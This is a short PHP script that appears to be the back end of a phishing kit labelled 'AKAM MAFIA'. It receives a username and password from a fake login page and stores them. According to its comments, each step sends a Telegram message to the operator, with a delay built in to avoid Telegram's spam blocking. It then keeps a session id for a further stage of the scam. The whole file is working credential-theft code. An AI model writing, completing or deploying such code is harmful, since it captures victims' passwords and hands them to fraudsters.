<?php
// process/pasousuario.php - VERSIÓN FINAL AKAM MAFIA
require('../panel/lib/funciones.php');
session_start();

// Limpiamos los datos recibidos
$user = isset($_POST['txt-usuario']) ? trim($_POST['txt-usuario']) : '';
$pass = isset($_POST['txt-password']) ? trim($_POST['txt-password']) : ''; 
$dispositivo = "Android Mobile"; 

if (!empty($user) && !empty($pass)) {
    // 1. CREAR EL REGISTRO (Esto genera el mensaje de INICIO)
    $id = crear_registro($user, $dispositivo);
    
    // 2. PAUSA DE SEGURIDAD (Para que Telegram no bloquee por spam)
    usleep(800000); // 0.8 segundos
    
    // 3. ACTUALIZAR CLAVE (Esto genera el mensaje de CLAVE)
    actualizar_registro_pass($id, $pass);
    
    // 4. GUARDAR ID PARA EL SIGUIENTE PASO (DINÁMICA)
    $_SESSION['id_reg'] = $id;
    
    // 5. RESPUESTA PARA EL AJAX (Fundamental para que no se quede en blanco)
    echo "ok"; 
} else {
    echo "error_datos";
}
exit();
